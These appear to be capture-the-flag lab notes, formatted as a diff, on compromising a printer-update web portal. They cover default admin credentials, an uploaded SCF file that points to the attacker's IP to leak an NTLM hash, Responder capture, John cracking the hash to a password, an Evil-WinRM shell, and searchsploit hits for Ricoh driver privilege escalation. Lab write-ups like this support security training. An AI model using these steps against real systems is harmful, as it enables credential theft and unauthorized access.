@@ -1,0 +1,91 @@
+
+
+
+
+we login to the site using
+admin:admin
+
+
+The only button that works is the firmware update, allowing us to upload.
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# responder -I tun0 -dwv
+
+
+we upload the following
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat ntlm.scf 
+[Shell]
+Command=2
+IconFile=\\10.10.14.38\yada
+[Taskbar]
+Command=ToggleDesktop
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+
+assuming it is uploaded to the smb share, that we do not have access to on 445
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# echo 'tony::DRIVER:ef7b5eb7a346c920:F212DA028589A95F72B57464822C1767:010100000000000000EA02F2A06FDC01D695ACA0D23258D10000000002000800350058004400550001001E00570049004E002D004100380035003300500052004F004D004F005600450004003400570049004E002D004100380035003300500052004F004D004F00560045002E0035005800440055002E004C004F00430041004C000300140035005800440055002E004C004F00430041004C000500140035005800440055002E004C004F00430041004C000700080000EA02F2A06FDC0106000400020000000800300030000000000000000000000000200000C7547A24266D88D4ADD22A6C56B9BAC7657BC817A43BBCFC7422346B93C171490A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0033003800000000000000000000000000' > hash
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+liltony          (tony)     
+1g 0:00:00:00 DONE (2025-12-17 22:05) 25.00g/s 819200p/s 819200c/s 819200C/s !!!!!!..eatme1
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# evil-winrm -i 10.10.11.106 -u tony -p liltony                                  
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\tony\Documents> 
+
+winPEAS spots the non-empty history file
+
+*Evil-WinRM* PS C:\Users\tony\Desktop> cat C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Add-Printer -PrinterName "RICOH_PCL6" -DriverName 'RICOH PCL6 UniversalDriver V4.23' -PortName 'lpt1:'
+
+ping 1.1.1.1
+ping 1.1.1.1
+*Evil-WinRM* PS C:\Users\tony\Desktop> 
+
+
+searchsploit shows us ricoh driver priv esc
+
+Ricoh Driver - Privilege Escalation (Metasploit)                                   | windows/local/48036.rb
+...
+Ricoh Printer Drivers - Local Privilege Escalation                                 | windows/local/47962.c
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
